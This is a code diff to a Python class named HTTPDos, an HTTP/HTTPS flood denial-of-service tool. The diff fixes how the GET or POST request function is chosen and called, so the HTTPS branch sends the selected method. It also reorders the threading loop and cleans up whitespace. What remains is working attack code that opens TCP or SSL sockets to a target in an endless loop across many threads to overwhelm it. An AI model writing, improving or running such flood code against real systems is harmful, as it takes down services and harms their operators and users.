@@ -28,9 +28,9 @@ class HTTPDos():
         HTTP(S) flood
         """
         if self.http_method == 'get':
-            http_method = self.get_http_request()
+            request_func = self.get_http_request
         elif self.http_method == 'post':
-            http_method = self.post_http_request()
+            request_func = self.post_http_request
         else:
             sys.exit(color_text(
                 'red', '[!] Error : HTTP method only GET or POST'))
@@ -44,7 +44,7 @@ class HTTPDos():
         if self.protocol == 'https':
             self.ssl_available = self.test_ssl_connection()
 
-        if  self.protocol == 'https' and self.ssl_available:
+        if self.protocol == 'https' and self.ssl_available:
 
             # Create ssl certificat
             context = ssl.create_default_context()
@@ -56,7 +56,7 @@ class HTTPDos():
 
                 # connection
                 ssl_sock.connect((self.target_ip, self.target_port))
-                ssl_sock.send(self.get_http_request())
+                ssl_sock.send(request_func())
                 ssl_sock.close()
 
                 i = next(counter)
@@ -71,7 +71,8 @@ class HTTPDos():
             while True:
                 sock = socket.socket(socket.AF_INET, TCP)
                 sock.connect((self.target_ip, self.target_port))
-                sock.send(http_method)
+                # call var with () at the end to call function
+                sock.send(request_func())
                 sock.close()
 
                 i = next(counter)
@@ -93,7 +94,7 @@ class HTTPDos():
             ssl_sock.connect((self.target_ip, self.target_port))
             ssl_sock.send(self.get_http_request())
             ssl_sock.close()
-            
+
             return True  # SSL valid
         except:
             color_text(
@@ -175,9 +176,9 @@ class HTTPDos():
         """
         threads = []
         try:
-            for _ in range(self.thread_number):
-                if self.protocol != False and self.protocol != '':
-                    if self.protocol == 'http' or self.protocol == 'https':
+            if self.protocol != False and self.protocol != '':
+                if self.protocol == 'http' or self.protocol == 'https':
+                    for _ in range(self.thread_number):
                         thread = Thread(target=self.http_flood())
                         threads.append(thread)
                         thread.start()
